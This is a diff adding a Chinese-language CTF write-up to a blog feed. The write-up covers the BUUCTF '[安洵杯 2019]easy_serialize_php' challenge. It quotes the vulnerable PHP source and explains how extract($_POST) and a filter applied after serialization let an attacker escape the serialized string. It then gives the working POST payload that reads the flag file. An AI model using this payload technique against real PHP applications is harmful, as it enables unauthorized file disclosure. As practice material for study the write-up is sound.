@@ -4,6 +4,25 @@
   
   
   <entry>
+    <title>BUU每日打卡</title>
+    <link href="/2021/03/05/BUU045/"/>
+    <url>/2021/03/05/BUU045/</url>
+    
+    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><code>[安洵杯 2019]easy_serialize_php</code>        </p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>题目给出源码          </p><pre><code> &lt;?php$function = @$_GET[&#39;f&#39;];function filter($img)&#123;       ##过滤    $filter_arr = array(&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;);    $filter = &#39;/&#39;.implode(&#39;|&#39;,$filter_arr).&#39;/i&#39;;    return preg_replace($filter,&#39;&#39;,$img);&#125;if($_SESSION)&#123;    unset($_SESSION);&#125;$_SESSION[&quot;user&quot;] = &#39;guest&#39;;           ##session初始值$_SESSION[&#39;function&#39;] = $function;extract($_POST);          if(!$function)&#123;    echo &#39;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#39;;&#125;if(!$_GET[&#39;img_path&#39;])&#123;    $_SESSION[&#39;img&#39;] = base64_encode(&#39;guest_img.png&#39;);&#125;else&#123;    $_SESSION[&#39;img&#39;] = sha1(base64_encode($_GET[&#39;img_path&#39;]));&#125;$serialize_info = filter(serialize($_SESSION));if($function == &#39;highlight_file&#39;)&#123;    highlight_file(&#39;index.php&#39;);&#125;else if($function == &#39;phpinfo&#39;)&#123;    eval(&#39;phpinfo();&#39;); //maybe you can find something in here!&#125;else if($function == &#39;show_image&#39;)&#123;    $userinfo = unserialize($serialize_info);    echo file_get_contents(base64_decode($userinfo[&#39;img&#39;]));&#125;          </code></pre><p>第一个点：<code>extract($_POST)</code><br>extract — 从数组中将变量导入到当前的符号表<br><img src="https://ftp.bmp.ovh/imgs/2021/03/881d9fbac954102b.png"><br>通过这个可以达到覆盖<code>$_SESSION</code>的目的<br>如：<br>在这句话的下面加上<code>var_dump($_SESSION);</code><br>原来的输出:<code>array(2) &#123; [&quot;user&quot;]=&gt; string(5) &quot;guest&quot; [&quot;function&quot;]=&gt; NULL &#125;</code><br>POST传入<code>_SESSION[flag]=123</code>后的输出是：<code>array(1) &#123; [&quot;flag&quot;]=&gt; string(3) &quot;123&quot; &#125;</code><br>第二个点：在<code>phpinfo</code>中找到文件<code>d0g3_f1ag.php</code><br>第三个点：<code>file_get_contents</code>以此读取文件，<code>$_SESSION[img]=d0g3_f1ag.php</code><br>第四个点：先序列化后过滤<br>之前做过一道<code>[0CTF 2016]piapiapia</code>是变长的<br>这道题是变短的过滤的字替换为空，但前面的数值代表的长度是不变的，会继续向后读<br>而且传入的SESSION是序列化后的数组，以<code>&#125;</code>结尾，后面的反序列化时会被舍弃，也就绕过了<code>$_SESSION[&#39;img&#39;] = base64_encode(&#39;guest_img.png&#39;);</code>        </p><h2 id="解"><a href="#解" class="headerlink" title="解"></a>解</h2><p>payload：<code>_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=a&quot;;s:8:&quot;function&quot;;s:6:&quot;adminn&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</code><br>这个payload进入后<code>$serialize_info</code>的输出是：<code>a:3:&#123;s:4:&quot;user&quot;;s:24:&quot;【&quot;;s:8:&quot;function&quot;;s:70:&quot;a】&quot;;s:8:&quot;function&quot;;s:6:&quot;adminn&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</code><br>【】是自己加的，这之间的是24个，被视为是user的值了<br><img src="https://ftp.bmp.ovh/imgs/2021/03/f64fe9e43e570e0c.png"><br>然后读取<code>/d0g3_fllllllag</code>即可      </p>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>wp</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>BUU每日一题044</title>
     <link href="/2021/03/04/BUU044/"/>
     <url>/2021/03/04/BUU044/</url>
